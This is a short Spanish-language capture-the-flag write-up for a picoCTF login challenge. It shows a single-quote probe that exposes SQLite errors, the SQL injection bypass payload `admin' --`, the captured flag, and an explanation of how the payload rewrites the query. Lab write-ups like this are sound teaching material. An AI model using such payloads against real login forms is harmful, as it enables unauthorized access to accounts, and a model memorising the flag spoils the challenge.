## Descripción
Do you think you can log us in? Try to see if you can login!
## Solución
- Al ingresar a la página, nos vamos a la sección de login. Para saber cómo se puede vulnerar debemos saber cómo funciona el login, por lo que hacemos un test ingresando una comilla simple (') en el campo de usuario para ver si puede ser explotada una vulnerabilidad con SQL injection, al hacerlo, nos devuelve el siguiente error: `**Warning**: SQLite3::query(): Unable to prepare statement: 1, unrecognized token: "''' AND password=''" in **/var/www/html/login.php** on line **9**`  
  `**Fatal error**: Uncaught Error: Call to a member function fetchArray() on boolean in /var/www/html/login.php:18 Stack trace: #0 {main} thrown in **/var/www/html/login.php** on line **18**`
- Vemos que se puede hacer SQL injection, así que ingresamos un payload para que nos de la bandera: `admin' --`
```text
picoCTF{s0m3_SQL_85832275}
```
## Notas Adicionales
- Sabiendo que existe la vulnerabilidad, se deduce la estructura típica de un formulario de autenticación en 
```sql
SELECT * FROM users WHERE username = 'ENTRADA_USUARIO' AND password = 'ENTRADA_PASSWORD';
```
- Al entender este esquema, el objetivo pasa de "saber la contraseña" a "alterar la lógica booleana de la instrucción SQL"
¿Por qué funciona este payload?
- Al ingresar admin' -- como nombre de usuario, la consulta ejecutada en la base de datos se transforma en:
```sql
SELECT * FROM users WHERE username = 'admin' --' AND password = '...';
```
## Referencias